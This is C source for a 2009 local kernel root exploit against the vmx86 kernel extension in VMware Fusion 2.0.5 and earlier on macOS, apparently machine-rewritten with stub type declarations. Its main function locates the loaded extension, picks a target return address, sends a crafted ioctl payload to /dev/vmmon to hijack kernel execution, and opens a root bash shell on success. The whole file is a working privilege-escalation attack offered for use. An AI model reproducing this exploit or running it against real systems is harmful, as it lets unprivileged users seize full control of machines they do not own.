
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct ioctl_req {int * pad; } ;
typedef int mach_port_t ;
struct TYPE_3__ {char* version; int address; scalar_t__ size; int * name; scalar_t__ next; } ;
typedef TYPE_1__ kmod_info_t ;
typedef scalar_t__ kern_return_t ;
struct TYPE_4__ {int shell_addr; int * name; } ;


 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 scalar_t__ KERN_SUCCESS ;
 int O_RDONLY ;
 int VMX86_INIT_IOCTL ;
 int close (int) ;
 int execve (char*,char**,int *) ;
 int exit (int ) ;
 int fflush (int ) ;
 int fprintf (int ,char*,char*,...) ;
 int getuid () ;
 int ioctl (int,int ,struct ioctl_req*) ;
 scalar_t__ kmod_get_info (int ,void*,unsigned int*) ;
 char* mach_error_string (scalar_t__) ;
 int mach_host_self () ;
 int memcpy (int **,int ,int) ;
 int memset (struct ioctl_req*,int,int) ;
 int open (char*,int ) ;
 int printf (char*,...) ;
 int sleep (int) ;
 int stderr ;
 int stdout ;
 scalar_t__ strcmp (int *,char*) ;
 char* strrchr (int *,char) ;
 TYPE_2__* targets_t ;
 int zleopard ;

int
main (int argc, char **argv)
{
  kmod_info_t *kmod_list, *k;
  mach_port_t host_port;
  kern_return_t mach_r;
  struct ioctl_req req;
  unsigned int count;
  int shell_addr;
  int fd, id, i, r;

  printf ("VMware Fusion <= 2.0.5 vmx86 kext local kernel root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  host_port = mach_host_self ();
  mach_r = kmod_get_info (host_port, (void *) &kmod_list, &count);
  if (mach_r != KERN_SUCCESS)
    {
      fprintf (stderr, "* couldn't get list of loaded kexts from kernel - %s\n",
               mach_error_string (mach_r));
      exit (EXIT_FAILURE);
    }

  for (k = kmod_list; k; k = (k->next) ? (k + 1) : ((void*)0))
    if (strcmp (k->name, "com.vmware.kext.vmx86") == 0)
      break;

  if (k == ((void*)0))
    {
      fprintf (stderr, "%s: vmx86 kext not loaded?\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  for (i = 0; targets_t[i].name; i++)
    if (strcmp (targets_t[i].name, k->version) == 0)
      {
        shell_addr = targets_t[i].shell_addr;
        break;
      }

  if (targets_t[i].name == ((void*)0))
    {
      fprintf (stderr, "%s: unsupported vmx86 version found :( [%s]\n",
               argv[0], k->version);
      exit (EXIT_FAILURE);
    }

  printf ("* kmod: %s, version: %s, addr: 0x%08X -> 0x%08X\n",
          strrchr (k->name, '.') + 1, k->version, (int) k->address, (int) (k->address + k->size));
  printf ("* ret addr: 0x%08X + 0x%08X = @0x%08X\n",
          (int) k->address, shell_addr + 0x1000, (int) k->address + shell_addr + 0x1000);

  fd = open ("/dev/vmmon", O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "%s: open failed\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  memset (&req, 0xCC, sizeof req);
  memcpy (&req.pad, zleopard, sizeof zleopard - 1);
  *(unsigned int *) &req.pad[0x21] = k->address + shell_addr + 0x1000;

  printf ("* hitting...");
  fflush (stdout);
  sleep (2);

  r = ioctl (fd, VMX86_INIT_IOCTL, &req);
  printf ("done\n\n");
  close (fd);

  id = getuid ();
  printf ("* getuid(): %d\n", id);
  if (id == 0)
    {
      char *args[] = { "/bin/bash", ((void*)0) };
      printf ("+Wh00t\n\n");

      execve (args[0], args, ((void*)0));
    }
  else
    fprintf (stderr, "%s: failed to obtain root :(\n", argv[0]);

  return (EXIT_SUCCESS);
}
